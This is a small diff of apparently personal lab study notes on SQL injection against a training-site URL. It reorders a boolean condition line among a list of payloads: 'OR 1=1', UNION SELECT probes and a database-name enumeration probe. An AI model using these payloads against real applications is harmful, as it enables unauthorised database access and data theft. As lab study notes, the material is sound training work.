@@ -1,6 +1,5 @@
 💉 **INJECTION**  💉
 
-<br>** Boolean conditions:** OR 1=1 and OR 1=2</br>
 
   # Authentication Bypass
 
@@ -11,6 +10,7 @@
   # Boolean Based
 --->  💉   **https://website.thm/checkuser?username=admin**
   - select * from users where username = '%username%' LIMIT 1;
+  - OR 1=1 and OR 1=2
   - admin123' UNION SELECT 1;--
   - admin123' UNION SELECT 1,2,3;--
   - admin123' UNION SELECT 1,2,3 where database() like '%';--
